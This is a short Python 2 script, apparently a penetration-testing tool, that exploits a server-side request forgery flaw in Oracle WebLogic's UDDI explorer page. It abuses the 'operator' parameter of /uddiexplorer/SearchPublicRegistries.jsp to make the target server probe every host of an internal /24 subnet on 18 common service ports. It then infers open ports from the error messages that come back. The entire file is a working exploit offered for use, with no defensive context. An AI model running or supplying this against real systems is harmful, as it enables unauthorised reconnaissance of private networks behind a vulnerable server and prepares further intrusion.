#!/usr/bin/env python
# coding: utf-8

import argparse
import thread
import time
import re
import requests

'Weblogic SSRF 扫描内网IP开放端口'


def ite_ip(ip):
    for i in range(1, 256):
        final_ip = '{ip}.{i}'.format(ip=ip, i=i)
        thread.start_new_thread(scan, (final_ip,))
        time.sleep(3)


def scan(final_ip):
    ports = ('21', '22', '23', '53', '80', '135', '139', '443', '445', '1080', '1433', '1521', '3306', '3389', '4899', '8080', '7001', '8000')
    for port in ports:
        vul_url = args.url + '/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search' % (final_ip, port)
        try:
            r = requests.get(vul_url, timeout=15, verify=False)
            result1 = re.findall('weblogic.uddi.client.structures.exception.XML_SoapException', r.content)
            result2 = re.findall('but could not connect', r.content)
            if len(result1) != 0 and len(result2) == 0:
                print final_ip + ':' + port
        except Exception, e:
            pass

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Weblogic SSRF vulnerable exploit')
    parser.add_argument('--url', dest='url', required=True, help='Target url')
    parser.add_argument('--ip', dest='scan_ip', help='IP to scan')
    args = parser.parse_args()
    ip = '.'.join(args.scan_ip.split('.')[:-1])
    ite_ip(ip)
